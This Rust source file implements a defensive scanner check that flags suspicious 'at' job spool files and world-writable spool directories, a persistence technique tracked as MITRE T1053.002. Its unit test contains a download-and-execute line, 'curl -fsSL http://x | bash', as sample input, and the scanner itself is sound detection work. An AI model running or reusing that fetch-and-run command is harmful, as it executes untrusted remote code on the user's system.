//! `at` job checks (T1053.002).
//!
//! at jobs are text spool files; the command body is parsed and run through the
//! same behavioral heuristics as cron.

use crate::checks::{combined_finding, Check};
use crate::ctx::ScanContext;
use crate::heuristics::{command_signals, path_signals};
use crate::model::{Confidence, Finding, Severity};
use crate::util;
use anyhow::Result;

const MAX_CONFIG: u64 = 2 * util::MB;
const DIRS: &[&str] = &[
    "/var/spool/cron/atjobs",
    "/var/spool/at",
    "/var/spool/atjobs",
    "/var/at/tabs",
];

pub struct AtCheck;

impl Check for AtCheck {
    fn id(&self) -> &'static str {
        "persist.at"
    }
    fn title(&self) -> &'static str {
        "at job persistence"
    }
    fn description(&self) -> &'static str {
        "at jobs containing backdoor or download-and-execute commands."
    }

    fn run(&self, ctx: &ScanContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();

        for dir in DIRS {
            let dir_path = ctx.abs(dir);
            if let Some(mode) = util::mode_of(&dir_path) {
                if util::is_world_writable(mode) && !util::is_sticky(mode) {
                    findings.push(
                        Finding::new(
                            self.id(),
                            Severity::High,
                            "at spool directory is world-writable",
                            "Any user can plant a scheduled job",
                        )
                        .at(ctx.disp(&dir_path), None)
                        .fix("chmod o-w on the spool directory")
                        .confidence(Confidence::Certain)
                        .mitre("T1053.002"),
                    );
                }
            }

            for file in util::files_in(&dir_path) {
                let logical = ctx.disp(&file);
                for (line_no, text) in util::read_lines(&file, MAX_CONFIG) {
                    let t = text.trim();
                    if !is_command_line(t) {
                        continue;
                    }
                    let mut hits = command_signals(t);
                    for token in t.split_whitespace() {
                        let path = token.trim_matches(|c| matches!(c, '"' | '\'' | ';' | ','));
                        if path.starts_with('/') {
                            hits.extend(path_signals(path));
                        }
                    }
                    if let Some(f) = combined_finding(
                        self.id(),
                        "Suspicious at job",
                        &logical,
                        Some(line_no),
                        t,
                        &hits,
                        "T1053.002",
                    ) {
                        findings.push(f);
                    }
                }
            }
        }
        Ok(findings)
    }
}

fn is_command_line(t: &str) -> bool {
    if t.is_empty()
        || t.starts_with('#')
        || t.starts_with("cd ")
        || t.starts_with("umask ")
        || t.starts_with("export ")
        || t.starts_with("exec ")
        || t == "{"
        || t == "}"
        || t == "fi"
        || t == "done"
    {
        return false;
    }
    // Environment assignment (ATRUN=..., PATH=..., etc.)
    if let Some(eq) = t.find('=') {
        let key = &t[..eq];
        if !key.contains(char::is_whitespace)
            && !key.is_empty()
            && key
                .chars()
                .all(|c| c.is_ascii_uppercase() || c == '_' || c.is_ascii_digit())
        {
            return false;
        }
    }
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn filters_headers_and_env() {
        assert!(!is_command_line("#!/bin/sh"));
        assert!(!is_command_line("PATH=/usr/bin:/bin"));
        assert!(!is_command_line("cd /"));
        assert!(!is_command_line("umask 22"));
        assert!(is_command_line("curl -fsSL http://x | bash"));
        assert!(is_command_line("/usr/local/bin/backup --full"));
    }
}
